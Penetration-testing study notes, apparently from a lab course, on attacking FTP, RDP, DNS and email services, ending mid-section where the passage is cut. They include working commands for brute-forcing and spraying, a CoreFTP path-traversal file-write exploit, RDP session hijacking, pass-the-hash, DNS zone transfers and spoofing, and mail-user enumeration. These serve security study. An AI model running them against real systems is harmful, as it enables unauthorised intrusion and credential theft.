# Attacking Network Services — Complete Study Notes

---

## Table of Contents

1. [Attacking FTP](#attacking-ftp)
2. [Attacking RDP](#attacking-rdp)
3. [Attacking DNS](#attacking-dns)
4. [Attacking Email Services](#attacking-email-services)
5. [Attacking SQL Databases](#attacking-sql-databases)
6. [Attacking SMB Services](#attacking-smb-services)

---

# Attacking FTP

The File Transfer Protocol (FTP) is a standard network protocol designed specifically to transfer files between computers over a TCP/IP network connection. It was one of the earliest protocols developed for the internet and remains widely used in corporate and development environments today. FTP also performs essential directory and file management operations such as changing the working directory, listing files, and renaming or deleting directories and files on the remote server. By default, FTP listens on TCP port 21, which is the control connection port used to send commands between the client and the server. To attack an FTP server, a penetration tester can abuse misconfigurations or excessive privileges, exploit known vulnerabilities, or discover new vulnerabilities through active enumeration and testing. After gaining access to the FTP service, it is critical to be aware of the directory contents so that sensitive or critical information can be identified and extracted during the engagement.

---

## Enumeration

Enumeration is the first and most important phase when targeting an FTP server, as it reveals the software version, configuration, and potential entry points for exploitation. Nmap default scripts triggered by the `-sC` flag include the `ftp-anon` script, which automatically checks whether a target FTP server allows anonymous logins without requiring credentials. The version enumeration flag `-sV` provides detailed and interesting information about FTP services, including the FTP banner, which often contains the version name of the FTP software running on the server. We can use the native `ftp` client or `nc` (Netcat) to interact directly with the FTP service and manually probe its responses and behavior. The `ftp-anon` Nmap script is particularly valuable because anonymous access is a common misconfiguration that can immediately expose sensitive files to an unauthenticated attacker. By default, FTP runs on TCP port 21, but administrators sometimes change this to a non-standard port such as 2121, so port scanning the full range is always recommended.

### Nmap

Nmap is the primary tool used for FTP enumeration because it combines port discovery, version detection, and script-based probing into a single powerful command. The command `sudo nmap -sC -sV -p 21 192.168.2.142` performs a targeted scan against port 21 on the specified IP address, running default scripts and service version detection simultaneously. The `-sC` flag activates the default NSE (Nmap Scripting Engine) scripts, which includes `ftp-anon` that attempts an anonymous login and lists readable files if access is granted. The `-sV` flag probes the open port to determine the exact service and version information, which is critical for identifying known vulnerabilities in specific FTP software versions. The `-p 21` flag restricts the scan to only port 21, making the scan faster and more targeted rather than scanning all 65535 ports. The output of the scan reveals the FTP banner (e.g., vsFTPd 2.3.4), the anonymous login status, directory listings, and file permissions — all of which are actionable intelligence for the attacker.

**Command:**

```bash
sudo nmap -sC -sV -p 21 192.168.2.142
```

**Output:**

```
Starting Nmap 7.91 at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170  924    31 Mar 28  2001 .banner
| d--x--x--x   2 root  root 1024 Jan 14  2002 bin
| d--x--x--x   2 root  root 1024 Aug 10  1999 etc
| drwxr-srwt   2 1170  924  2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root  root 1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170  924  1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```

The `ftp-anon` script confirms anonymous login is allowed (FTP response code 230 means login successful), and the `incoming` directory is flagged as writable, which is a critical finding because it allows file uploads without authentication. The permissions column (e.g., `-rw-r--r--`) reveals exactly what the anonymous user can read, write, or execute in each listed file and directory.

---

## Misconfigurations

Misconfigurations in FTP services are among the most common and dangerous security weaknesses found during penetration testing engagements in real-world environments. Anonymous authentication is one such misconfiguration where the FTP server is set up to allow any user to log in using the username `anonymous` and no password, or any string as the password (some servers accept an email address format). This becomes extremely dangerous for a company if read and write permissions have not been correctly restricted for the anonymous user, because the server may be exposing sensitive company data to anyone on the internet or internal network. With anonymous login access, the attacker could discover sensitive information such as credentials, configuration files, database backups, or source code stored carelessly in publicly accessible FTP directories. Beyond downloading sensitive information, write permissions would allow the attacker to upload malicious scripts, web shells, or payloads that could be triggered through other vulnerabilities such as path traversal in a web application. Exploiting other vulnerabilities in combination with FTP misconfigurations — such as executing an uploaded PHP web shell via a path traversal — greatly amplifies the impact of what might otherwise seem like a low-risk misconfiguration.

### Anonymous Authentication

Anonymous authentication is the act of logging into an FTP server without providing real credentials, using the username `anonymous` and either no password or any arbitrary string as the password. To perform this, a tester runs the `ftp` command followed by the target IP address, and when prompted for a username, enters `anonymous` — when prompted for a password, simply presses Enter or types any string. The server responds with code `230 Login successful`, confirming that the anonymous user has been granted access to the FTP service and its directory structure. Once inside, standard Linux-like navigation commands are available: `ls` lists directory contents, `cd` changes directories, `get <filename>` downloads a single file, and `mget <pattern>` downloads multiple files matching a pattern. For upload operations, `put <filename>` uploads a single local file to the FTP server, and `mput` handles multiple file uploads in a single operation — both are critical attack vectors when write permissions are misconfigured. The `help` command inside the FTP client session prints a list of all available FTP commands, which is useful when working with unfamiliar FTP implementations or non-standard servers.

**Step-by-Step — Performing Anonymous FTP Login:**

**Step 1 — Connect to the FTP server:**

```bash
ftp 192.168.2.142
```

This initiates a TCP connection to port 21 on the target IP. The server responds with its banner (e.g., `220 (vsFTPd 2.3.4)`), confirming the service is alive and revealing the software version.

**Step 2 — Enter the anonymous username:**

```
Name (192.168.2.142:kali): anonymous
```

The server responds with `331 Please specify the password`, indicating it accepts the anonymous username and is waiting for a password to proceed.

**Step 3 — Enter any password (or blank):**

```
Password: [press Enter]
```

The server responds with `230 Login successful`, confirming anonymous access is granted. The server also reports the remote system type (UNIX) and the transfer mode (binary).

**Step 4 — List the directory contents:**

```
ftp> ls
```

The server responds with `150 Here comes the directory listing` and then displays all files and directories.

**Step 5 — Download a file:**

```
ftp> get test.txt
```

This downloads the file `test.txt` from the remote FTP server to the current local working directory on the attacker's machine.

**Output observed during lab session (non-standard port 2121):**

```
ftp -P 2121 anonymous@10.129.203.6
Connected to 10.129.203.6.
220 ProFTPD Server (InlaneFTP) [10.129.203.6]
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22514|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp   ftp   1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp   ftp     72 Apr 19  2022 users.list
```

In this lab scenario, the FTP server was running on the non-standard port 2121, so the `-P 2121` flag was used. Two highly sensitive files were discovered: `passwords.list` (1959 bytes) and `users.list` (72 bytes), both of which are prime targets for download and use in further attacks such as brute-forcing other services. Both files would be downloaded using `get passwords.list` and `get users.list` for offline analysis.

---

## Protocol Specifics Attacks

Protocol-specific attacks target the inherent behaviors, commands, and design decisions of the FTP protocol rather than individual software bugs or implementation errors alone. It is essential to understand that we are not attacking the FTP protocol specification itself, but rather the services and software implementations that use the protocol and process its commands in different ways. Because there are dozens of different FTP server software implementations — such as vsFTPd, ProFTPD, FileZilla Server, and CoreFTP — each processes protocol commands differently, creating unique attack surfaces per implementation. Two major protocol-specific attacks against FTP are brute-forcing login credentials and the FTP bounce attack, both of which exploit the protocol's native command set and connection architecture.

### Brute Forcing

Brute forcing FTP login credentials is the technique of systematically trying large numbers of username and password combinations until the correct pair is found and access is granted. Medusa is a fast, parallel, and modular login brute-forcer that supports many protocols including FTP, SSH, HTTP, and SMB. The `-u` option specifies a single username to target, while `-U` accepts a file containing a list of multiple usernames. The `-P` option takes a path to a wordlist file containing passwords to try. The `-M` option specifies the protocol module to use (in this case `ftp`), and the `-h` option specifies the target hostname or IP address.

**Step-by-Step — Brute Forcing FTP with Medusa:**

**Step 1 — Identify the target username:**
Before running Medusa, a known or suspected username must be available. In this case `fiona` was identified through prior enumeration.

**Step 2 — Select the wordlist:**
The `rockyou.txt` wordlist located at `/usr/share/wordlists/rockyou.txt` is chosen because it contains millions of real-world leaked passwords.

**Step 3 — Run the Medusa brute force command:**

```bash
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

- `-u fiona` — targets the specific username fiona
- `-P /usr/share/wordlists/rockyou.txt` — uses the rockyou wordlist as the password list
- `-h 10.129.203.7` — sets the target FTP server IP address
- `-M ftp` — tells Medusa to use its FTP module for the attack

**Step 4 — Monitor the output:**

```
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

The password `family` was found for user `fiona`. Note that most modern applications implement account lockout, rate limiting, or CAPTCHA to prevent brute-force attacks, so Password Spraying (trying one common password against many users) is often a more effective and stealthy alternative in hardened environments.

### FTP Bounce Attack

The FTP bounce attack is a network attack technique that exploits the FTP protocol's `PORT` command to make an FTP server act as a proxy and send traffic to other internal hosts that may not be directly accessible to the attacker. The attack works because the FTP `PORT` command was designed to allow the client to specify an arbitrary IP address and port for the data connection, which means a malicious client can tell the FTP server to connect to a third-party host instead of the client itself. Nmap provides the `-b` flag specifically for performing FTP bounce attacks. Modern FTP servers include protections that prevent bounce attacks by default, but misconfigured or outdated FTP servers may still be vulnerable.

**Step-by-Step — FTP Bounce Attack with Nmap:**

**Step 1 — Identify the exposed FTP server:**
The attacker discovers a publicly reachable FTP server at `10.10.110.213` that allows anonymous login and has not disabled the PORT command abuse protection.

**Step 2 — Identify the internal target:**
Through prior reconnaissance, the internal host `172.17.0.2` is identified as a target whose open ports need to be discovered, but it is not directly reachable from the attacker's machine.

**Step 3 — Run the Nmap FTP bounce scan:**

```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

- `-Pn` — skips host discovery
- `-v` — enables verbose output
- `-n` — disables DNS resolution
- `-p80` — targets only port 80 on the internal host
- `-b anonymous:password@10.10.110.213` — uses the FTP server as the bounce proxy

**Step 4 — Interpret the results:**

```
PORT   STATE  SERVICE
80/tcp open   http
```

Nmap confirms that port 80 is open on the internal host `172.17.0.2`, information obtained entirely by routing the scan through the FTP bounce server.

---

## Latest FTP Vulnerabilities

### CVE-2022-22836 — CoreFTP Path Traversal & Arbitrary File Write

Understanding the latest FTP vulnerabilities requires analyzing both the technical flaw in the software and the conceptual attack pattern it enables. CVE-2022-22836 affects CoreFTP before build 727 — an FTP service that does not correctly process the HTTP PUT request, leading to authenticated directory/path traversal and arbitrary file write. The vulnerability arises because the CoreFTP service accepts HTTP PUT requests in addition to the standard FTP POST requests for uploading files, but fails to properly validate or restrict the file path provided in the PUT request. This path validation failure allows an authenticated attacker to use directory traversal sequences (`../`) in the path to write files outside the directory the service is intended to access — including sensitive system directories.

### The Concept of the Attack

The CoreFTP vulnerability is fundamentally a path traversal combined with arbitrary file write, triggered by sending a crafted HTTP PUT request through the FTP service's built-in HTTP handling capability. The `--path-as-is` flag in cURL is essential because without it, cURL would automatically normalize and clean the path, removing the `../` traversal sequences before sending the request. The attack is broken into two logical phases: first the **Directory Traversal** phase where the application's path restrictions are bypassed, and second the **Arbitrary File Write** phase where the attacker's chosen content is written to a location of their choosing on the target system.

**The Exploit Command:**

```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> \
--data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Each flag explained:

- `-k` — disables SSL certificate verification
- `-X PUT` — specifies the HTTP method as PUT, which is the trigger for the vulnerable code path in CoreFTP
- `-H "Host: <IP>"` — sets the HTTP Host header to the target IP address
- `--basic -u <username>:<password>` — sends HTTP Basic Authentication credentials
- `--data-binary "PoC."` — specifies the content to write into the file
- `--path-as-is` — instructs cURL NOT to normalize the URL path, preserving the `../` sequences
- `https://<IP>/../../../../../../whoops` — the path with traversal sequences escaping the restricted directory

### Directory Traversal

Directory traversal is the first phase of the CoreFTP CVE-2022-22836 exploit. The FTP service is configured to serve files only from a specific directory on the server. However, because the service fails to validate or sanitize the path provided in the PUT request, it processes the `../../` sequences literally, navigating upward through the directory tree. The application does perform an authorization check, but this check only verifies whether the user is allowed in the originally designated folder — once the traversal breaks out of that folder, the authorization restriction no longer applies.

**Step-by-Step — Directory Traversal Phase:**

| Step | Action | Category |
|------|--------|----------|
| 1 | User specifies HTTP PUT request with `../../../../../../whoops` as the path, which includes escape sequences to break out of the restricted area | Source |
| 2 | The HTTP PUT request, file contents, and the unvalidated traversal path are accepted and processed by the CoreFTP service | Process |
| 3 | The application checks authorization only against the original restricted folder — since the path has escaped that folder via traversal, the restriction is bypassed entirely | Privileges |
| 4 | The resolved destination path outside the restricted directory is passed to the next process responsible for writing the file content to disk | Destination |

### Arbitrary File Write

Arbitrary file write is the second phase of the exploit, which begins immediately after the directory traversal has successfully bypassed the path restrictions. In this phase, the same information the attacker provided in the original cURL command — the filename (`whoops`) and the binary content (`PoC.`) — serves as the input that gets written directly to the filesystem at the traversal-resolved path.

**Step-by-Step — Arbitrary File Write Phase:**

| Step | Action | Category |
|------|--------|----------|
| 5 | The filename `whoops` and content `"PoC."` from the original cURL command are used as the write source | Source |
| 6 | The CoreFTP process takes the specified filename and content and proceeds to execute the file write operation to the resolved path | Process |
| 7 | Since all restrictions were bypassed during the traversal phase, the service approves writing the content to the specified file without further checks | Privileges |
| 8 | The file `whoops` with content `"PoC."` is created on the local filesystem of the target system at the traversal-resolved path | Destination |

**Verification on the Target System:**

```cmd
C:\> type C:\whoops
PoC.
```

The output `PoC.` confirms that the arbitrary file write was successful, the file was created outside the restricted FTP directory, and the attacker has demonstrated the ability to write arbitrary content to arbitrary locations on the target system — which in a real attack could mean writing a web shell, a scheduled task script, or overwriting a critical configuration file.

---

# Attacking RDP

Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection. It is one of the most popular administration tools in enterprise environments. By default, RDP uses port **TCP/3389** as its communication channel. Unfortunately, while RDP greatly facilitates remote administration, it also creates another attack gateway for adversaries who can exploit weak credentials, misconfigurations, or software vulnerabilities.

---

## Enumeration

Before attacking any RDP service, the first task is to confirm the service is running on the target host and identify any relevant configuration details that will shape the attack approach.

**Command:**

```bash
nmap -Pn -p3389 192.168.2.143
```

**Output:**

```
Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

The output confirms that port 3389 is open and the service `ms-wbt-server` (Microsoft Windows-Based Terminal Server) is active, meaning RDP is running and awaiting connections on this target.

---

## Misconfigurations

Misconfigurations in RDP deployments are a common and significant attack surface. Since RDP takes user credentials for authentication, one of the most common attack vectors is password guessing. A critical caveat is the client's password policy — many Windows environments lock or disable an account after a certain number of failed login attempts, which means aggressive brute-forcing can inadvertently lock out valid accounts. To avoid account lockout, **Password Spraying** is used — which tries a single commonly used password across many usernames. Two tools commonly used for RDP password spraying are **Crowbar** and **Hydra**.

### Crowbar — RDP Password Spraying

Crowbar is a brute-forcing tool specifically designed for protocols that are difficult to attack with traditional tools, and it includes RDP support.

**Step-by-Step — RDP Password Spraying with Crowbar:**

**Step 1 — Prepare the username list:**

```
root
test
user
guest
admin
administrator
```

**Step 2 — Run the Crowbar spray:**

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

- `-b rdp` — activates the RDP protocol module
- `-s 192.168.220.142/32` — targets the single host at this IP address
- `-U users.txt` — reads the usernames to test from the file
- `-c 'password123'` — sets the single password to spray across all usernames

**Step 3 — Read the output:**

```
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
```

### Hydra — RDP Password Spraying

Hydra is a highly versatile, parallel login brute-forcing tool that supports dozens of protocols including RDP.

**Command:**

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

**Output:**

```
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
```

### RDP Login

Once valid credentials have been discovered, two commonly used RDP clients in Linux-based penetration testing environments are `rdesktop` and `xfreerdp`.

**Command:**

```bash
rdesktop -u admin -p password123 192.168.2.143
```

The connection proceeds, a certificate warning appears, and after typing `yes`, the full Windows graphical desktop is presented in a new window on the attacker's screen.

---

## Protocol Specific Attacks

### RDP Session Hijacking

RDP Session Hijacking allows an attacker who already has access to a Windows machine with Administrator privileges to silently take over another user's active RDP session without knowing that user's password, by using the built-in Windows tool `tscon.exe`. To successfully impersonate a user without their password, SYSTEM-level privileges are required.

**Step-by-Step — RDP Session Hijacking:**

**Step 1 — List all active RDP sessions:**

```cmd
C:\htb> query user
 USERNAME     SESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME
>juurena      rdp-tcp#13     1  Active          7  8/25/2021 1:23 AM
 lewen        rdp-tcp#14     2  Active          *  8/25/2021 1:28 AM
```

**Step 2 — Create a Windows service to hijack the session:**

```cmd
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

**Step 3 — Start the service to trigger the hijack:**

```cmd
C:\htb> net start sessionhijack
```

Starting the service causes it to execute as LocalSystem (SYSTEM), which provides the elevated privileges needed for `tscon.exe` to bypass password authentication and connect the victim's session directly to the attacker's RDP window.

> **Note:** This method no longer works on Windows Server 2019.

### RDP Pass-the-Hash (PtH)

RDP Pass-the-Hash allows an attacker who possesses only the NTLM hash of a user's password to authenticate to an RDP session and gain full graphical access to the target Windows system without ever cracking the hash. The key requirement is that **Restricted Admin Mode** must be enabled on the target host.

**Step-by-Step — RDP Pass-the-Hash:**

**Step 1 — Enable Restricted Admin Mode via registry (if not already enabled):**

```cmd
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

**Step 2 — Use xfreerdp with the NTLM hash:**

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

- `/v:192.168.220.152` — specifies the target RDP server IP address
- `/u:lewen` — specifies the username whose hash is being used for authentication
- `/pth:300FF5E89EF33F83A8146C10F5AB9BB9` — passes the NTLM hash directly instead of a plaintext password

> **Note:** RDP PtH will not work against every Windows system — Restricted Admin Mode must be enabled and the user must have RDP access rights to the target machine.

---

## Latest RDP Vulnerabilities

### CVE-2019-0708 — BlueKeep

In 2019, a critical vulnerability was discovered in the RDP service assigned **CVE-2019-0708**, commonly known as **BlueKeep**. It allows an unauthenticated remote attacker to execute arbitrary code on vulnerable Windows systems simply by sending a specially crafted RDP connection request. BlueKeep is classified as a **wormable vulnerability** — meaning it can self-propagate across networks without any user interaction. An initial scan identified approximately 950,000 Windows systems publicly exposed and vulnerable to BlueKeep attacks.

### The Concept of the Attack

The BlueKeep vulnerability is rooted in a **Use-After-Free (UAF)** memory corruption bug in the RDP service's kernel-level channel management code, specifically triggered during the initial connection setup phase **before any user authentication is required**. Because the RDP service runs with the LocalSystem Account, any code execution achieved through this vulnerability immediately runs with full system privileges.

**Initiation Phase — Concept of Attacks Table:**

| Step | BlueKeep Action | Category |
|------|----------------|----------|
| 1 | The attacker sends a manipulated initialization request during the RDP settings exchange handshake between client and server | Source |
| 2 | The request invokes a function used to create a virtual channel that contains the Use-After-Free vulnerability | Process |
| 3 | The RDP service runs automatically with LocalSystem Account privileges, so the entire exploit chain benefits from SYSTEM-level access | Privileges |
| 4 | The manipulation of the vulnerable function redirects execution flow into a kernel-level process, setting up the second phase | Destination |

**RCE Trigger Phase — Concept of Attacks Table:**

| Step | BlueKeep Action | Category |
|------|----------------|----------|
| 5 | The attacker's crafted payload is the source, inserted into the process to free kernel memory and place shellcode instructions in the freed region | Source |
| 6 | The kernel process is triggered to free the targeted memory region and direct the CPU instruction pointer to the attacker's shellcode | Process |
| 7 | Since the kernel runs with the highest possible privileges (LocalSystem), the shellcode placed in the freed kernel memory also executes with full LocalSystem Account privileges | Privileges |
| 8 | A reverse shell is sent over the network from the compromised target back to the attacker's host, granting full SYSTEM-level remote access | Destination |

> **Not all Windows versions are vulnerable:** Windows 8, Windows 10, Windows Server 2012, Windows Server 2016, and Windows Server 2019 are NOT affected. Windows 7, Windows XP, Windows Server 2003, and Windows Server 2008 ARE vulnerable if unpatched.

---

# Attacking DNS

The Domain Name System (DNS) is a foundational internet protocol responsible for translating human-readable domain names (e.g., `hackthebox.com`) into numerical IP addresses that computers use to route network traffic. DNS primarily operates over **UDP port 53** but also uses **TCP port 53** for larger responses, zone transfers, and other operations. Successful DNS attacks can redirect users to malicious servers, expose the internal network topology of an organization, enable subdomain takeover for phishing, or allow an attacker to intercept and manipulate all DNS-dependent traffic on a network segment.

---

## Enumeration

DNS enumeration is the process of systematically extracting information about a target organization's DNS infrastructure. The Nmap `-sC` and `-sV` options can be combined and targeted at port 53 to perform initial enumeration.

**Command:**

```bash
nmap -p53 -Pn -sV -sC 10.10.110.213
```

**Output:**

```
PORT   STATE SERVICE   VERSION
53/tcp open  domain    ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```

---

## DNS Zone Transfer

A DNS zone transfer is a mechanism by which DNS servers copy a portion of their zone database to another DNS server. The critical security problem is that unless a DNS server is explicitly configured to restrict which IP addresses are allowed to request a zone transfer, **anyone can send an AXFR request and receive a complete copy of the entire zone database without any authentication.**

### DIG — AXFR Zone Transfer

The `dig` utility is a powerful DNS query tool that can perform all types of DNS queries including zone transfers.

**Command:**

```bash
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

**Output:**

```
inlanefrieght.htb.         604800  IN  SOA   localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN  A     10.129.110.22
admin.inlanefrieght.htb.   604800  IN  A     10.129.110.21
hr.inlanefrieght.htb.      604800  IN  A     10.129.110.25
support.inlanefrieght.htb. 604800  IN  A     10.129.110.28
```

The output reveals internal IP addresses and hostnames that are not publicly advertised but are now fully exposed to the attacker.

### Fierce — Zone Transfer Enumeration

Fierce is a DNS enumeration and zone transfer testing tool that automatically discovers all DNS servers for a target root domain and then attempts a zone transfer against each one.

**Command:**

```bash
fierce --domain zonetransfer.me
```

---

## Domain Takeovers & Subdomain Enumeration

Domain takeover involves registering or claiming a domain name that was previously used by a target organization but has since expired or been abandoned. A particularly dangerous and more common variant is **subdomain takeover**, which targets CNAME records in a domain's DNS configuration that point to third-party services whose associated accounts or resources have been deleted or expired.

### Subdomain Enumeration

**Step-by-Step — Subdomain Enumeration:**

**Step 1 — Run Subfinder against the target domain:**

```bash
./subfinder -d inlanefreight.com -v
```

**Step 2 — Clone and run Subbrute for internal/offline brute-forcing:**

```bash
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

**Step 3 — Check CNAME records for takeover candidates:**

```bash
host support.inlanefreight.com
# support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

The subdomain resolves via CNAME to an AWS S3 bucket name. Visiting it returns a `NoSuchBucket` error, confirming the S3 bucket no longer exists and the subdomain is vulnerable to takeover.

---

## DNS Spoofing

DNS Spoofing (also known as **DNS Cache Poisoning**) is an attack that involves injecting false DNS record information into a DNS server's cache, causing legitimate domain name queries to resolve to fraudulent IP addresses controlled by the attacker.

### Local DNS Cache Poisoning with Ettercap

**Step-by-Step — DNS Cache Poisoning with Ettercap:**

**Step 1 — Edit the Ettercap DNS spoofing configuration file:**

```bash
cat /etc/ettercap/etter.dns
```

Add the following entries:

```
inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

**Step 2 — Launch Ettercap and scan for live hosts:**
Open Ettercap and navigate to `Hosts > Scan for Hosts`.

**Step 3 — Set targets for ARP poisoning:**
Add the victim host (`192.168.152.129`) to Target 1 and the default gateway (`192.168.152.2`) to Target 2.

**Step 4 — Activate the dns_spoof plugin:**
Navigate to `Plugins > Manage Plugins` and double-click `dns_spoof` to activate it.

**Step 5 — Verify the attack:**

```cmd
C:\>ping inlanefreight.com
Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
```

---

## Latest DNS Vulnerabilities — Subdomain Takeover

The most significant modern DNS vulnerability category is **Subdomain Takeover**. A 2020 study by RedHuntLabs examining 220 million domains found over 424,000 subdomains potentially vulnerable to subdomain takeover, with 62% of those vulnerabilities belonging to the e-commerce sector.

**Initiation Phase — Concept of Attacks Table:**

| Step | Subdomain Takeover Action | Category |
|------|--------------------------|----------|
| 1 | The discovered abandoned subdomain name that is no longer used by the company serves as the source for the attack | Source |
| 2 | The attacker registers the same subdomain resource at the third-party provider and links it to their own content or server | Process |
| 3 | Privileges lie with the primary domain owner who controls DNS — but the third-party provider does not restrict who can claim the resource name | Privileges |
| 4 | The attacker's server or service account at the third-party provider becomes the destination that now owns the claimed resource | Destination |

**Forwarding Trigger Phase — Concept of Attacks Table:**

| Step | Subdomain Takeover Action | Category |
|------|--------------------------|----------|
| 5 | The visitor's browser request for the abandoned subdomain URL, using the outdated CNAME record still present in company DNS, serves as the source | Source |
| 6 | The DNS server looks up the subdomain, finds the CNAME record, and redirects the visitor to the third-party domain now controlled by the attacker | Process |
| 7 | The DNS administrators who control the parent domain have not removed the stale CNAME, so the server treats the subdomain as trustworthy and forwards traffic | Privileges |
| 8 | The visitor receives the attacker's malicious content in their browser, believing they are on a legitimate company page, serving as the destination | Destination |

---

# Attacking Email Services

A mail server handles sending, receiving, and delivering email messages over a network. When a user presses the Send button in their email client, the client establishes a TCP connection to an **SMTP (Simple Mail Transfer Protocol)** server. When users download their email, their client connects to either a **POP3** (Post Office Protocol version 3) or **IMAP4** (Internet Message Access Protocol version 4) server.

**Email Port Reference Table:**

| Port | Service |
|------|---------|
| TCP/25 | SMTP Unencrypted |
| TCP/143 | IMAP4 Unencrypted |
| TCP/110 | POP3 Unencrypted |
| TCP/465 | SMTP Encrypted |
| TCP/587 | SMTP Encrypted/STARTTLS |
| TCP/993 | IMAP4 Encrypted |
| TCP/995 | POP3 Encrypted |

---

## Enumeration

**Step-by-Step — Email Server Enumeration:**

**Step 1 — Query MX records with the host command:**

```bash
host -t MX hackthebox.eu
# hackthebox.eu mail is handled by 1 aspmx.l.google.com.

host -t MX microsoft.com
# microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

**Step 2 — Query MX records with dig and filter output:**

```bash
dig mx inlanefreight.com | grep "MX" | grep -v ";"
# inlanefreight.com.   300   IN   MX   10 mail1.inlanefreight.com.
```

**Step 3 — Resolve the mail server hostname to an IP:**

```bash
host -t A mail1.inlanefreight.htb.
# mail1.inlanefreight.htb has address 10.129.14.128
```

**Step 4 — Nmap scan against all email-related ports:**

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

---

## Misconfigurations

### Authentication — VRFY, EXPN, RCPT TO, USER Commands

The SMTP and POP3 protocols include several commands that can be abused for user enumeration when left enabled on improperly configured servers:

- **VRFY** — validates whether a given email username exists; responds with `252` (user exists) or `550` (user does not exist)
- **EXPN** — expands a distribution list or alias and reveals all individual email addresses that are members
- **RCPT TO** — can determine which recipients the server accepts (valid users) versus which ones it rejects (invalid users)
- **USER** — in POP3, responds with `+OK` if the user exists or `-ERR` if the user does not

**Step-by-Step — Manual User Enumeration via Telnet:**

**Step 1 — Connect to the SMTP server on port 25:**

```bash
telnet 10.10.110.20 25
220 parrot ESMTP Postfix (Debian/GNU)
```

**Step 2 — Test the VRFY command:**

```
VRFY root
252 2.0.0 root

VRFY www-data
252 2.0.0 www-data

VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

**Step 3 — Test the EXPN command:**

```
EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

**Step 4 — Test the RCPT TO command:**

```
MAIL FROM:test@htb.com
250 2.1.0 test@htb.com... Sender ok

RCPT TO:julio
550 5.1.1 julio... User unknown

RCPT TO:john
250 2.1.5 john... Recipient ok
```

**Step 5 — Test the POP3 USER command:**

```
USER julio
-ERR

USER john
+OK
```

**Step 6 — Automate enumeration with smtp-user-enum:**

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

**Output:**

```
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
3 results. 78 queries in 11 seconds (7.1 queries / sec)
```

---

## Cloud Enumeration

Cloud email services such as Microsoft Office 365 and Google Workspace have replaced on-premises mail servers for a large proportion of organizations. **O365Spray** is a specialized username enumeration and password spraying tool developed specifically for Microsoft Office 365 environments.

**Step-by-Step — O365 Enumeration:**

**Step 1 — Validate that the target domain uses Office 365:**

```bash
python3 o365spray.py --validate --domain msplaintext.xyz
# [VALID] The following domain is using O365: msplaintext.xyz
```

**Step 2 — Enumerate valid usernames against the O365 tenant:**

```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

**Output:**

```
[VALID] lewen@msplaintext.xyz
[VALID] juurena@msplaintext.xyz
Valid Accounts: 2
```

---

## Password Attacks

**Step-by-Step — Password Spraying:**

**Step 1 — Hydra password spray against POP3:**

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

**Output:**

```
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
```

**Step 2 — O365Spray password spray against Office 365:**

```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

**Output:**

```
[VALID] lewen@msplaintext.xyz:March2022!
Valid Credentials: 1
```

---

## Protocol Specifics Attacks — Open Relay

An open relay is an SMTP server that is improperly configured to accept and forward email from any source address to any destination address without requiring authentication. From an attacker's perspective, an open relay is a powerful phishing and email spoofing tool.

**Step-by-Step — Open Relay Abuse:**

**Step 1 — Test for open relay with Nmap:**

```bash
